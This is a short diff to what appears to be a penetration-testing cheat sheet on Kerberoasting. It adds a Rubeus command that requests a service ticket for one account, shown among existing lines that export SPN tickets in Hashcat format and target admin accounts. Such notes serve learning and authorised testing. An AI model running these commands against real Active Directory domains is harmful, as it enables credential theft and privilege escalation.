@@ -862,6 +862,9 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 # Using the /stats Flag
 .\Rubeus.exe kerberoast /stats
 
+# get ticket (we can see the supported Encryption type also)
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+
 # Using the /nowrap Flag
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ```
